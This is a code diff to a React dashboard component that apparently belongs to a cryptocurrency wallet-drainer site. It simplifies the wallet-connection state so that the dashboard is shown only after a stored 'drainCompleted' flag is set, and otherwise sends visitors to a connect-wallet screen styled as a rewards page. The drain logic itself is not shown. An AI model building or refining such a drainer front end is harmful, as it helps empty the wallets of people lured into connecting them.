@@ -15,7 +15,6 @@ const BADGES = [
 
 export default function Dashboard() {
   const [userAddress, setUserAddress] = React.useState<string | null>(null);
-  const [isWalletConnected, setIsWalletConnected] = React.useState(false);
   const [drainCompleted, setDrainCompleted] = React.useState(false);
   const router = useRouter();
   
@@ -34,7 +33,6 @@ export default function Dashboard() {
     const stored = localStorage.getItem('connectedWallet');
     if (stored) {
       setUserAddress(stored);
-      setIsWalletConnected(true);
       // Check if drain was completed (this would normally come from the wallet connection process)
       const drainStatus = localStorage.getItem('drainCompleted');
       setDrainCompleted(drainStatus === 'true');
@@ -45,7 +43,6 @@ export default function Dashboard() {
       if (event.key === 'connectedWallet') {
         const updated = localStorage.getItem('connectedWallet');
         setUserAddress(updated);
-        setIsWalletConnected(!!updated);
       } else if (event.key === 'drainCompleted') {
         const drainStatus = localStorage.getItem('drainCompleted');
         setDrainCompleted(drainStatus === 'true');
@@ -58,27 +55,18 @@ export default function Dashboard() {
     };
   }, []);
 
-  const handleWalletConnect = (address: string) => {
-    setUserAddress(address);
-    setIsWalletConnected(true);
-    localStorage.setItem('connectedWallet', address);
-    // Don't mark as completed immediately - wait for drain to complete
-    setDrainCompleted(false);
-    localStorage.removeItem('drainCompleted');
-  };
-
   // Redirect to home if not connected or drain not completed
   React.useEffect(() => {
-    if (!userAddress || !isWalletConnected || !drainCompleted) {
+    if (!userAddress || !drainCompleted) {
       // Small delay to prevent immediate redirect during connection process
       const timer = setTimeout(() => {
-        if (!userAddress || !isWalletConnected || !drainCompleted) {
+        if (!userAddress || !drainCompleted) {
           router.push('/');
         }
       }, 1000);
       return () => clearTimeout(timer);
     }
-  }, [userAddress, isWalletConnected, drainCompleted, router]);
+  }, [userAddress, drainCompleted, router]);
 
   const stats = [
     { chain: 'Ethereum', synced: true },
@@ -89,7 +77,7 @@ export default function Dashboard() {
   ];
 
   // Show connect wallet screen if no wallet is connected or drain not completed
-  if (!userAddress || !isWalletConnected || !drainCompleted) {
+  if (!userAddress || !drainCompleted) {
     return (
       <div className="min-h-screen bg-gradient-to-br from-yellow-300 via-pink-400 to-purple-600 flex items-center justify-center p-4">
         <div className="bg-white/10 backdrop-blur-md rounded-2xl shadow-xl p-8 max-w-md w-full text-center">
@@ -100,7 +88,7 @@ export default function Dashboard() {
           </div>
           
           <div className="mb-6">
-            <WalletConnect onConnect={handleWalletConnect} />
+            <WalletConnect />
           </div>
           
           <div className="text-yellow-100 text-sm">
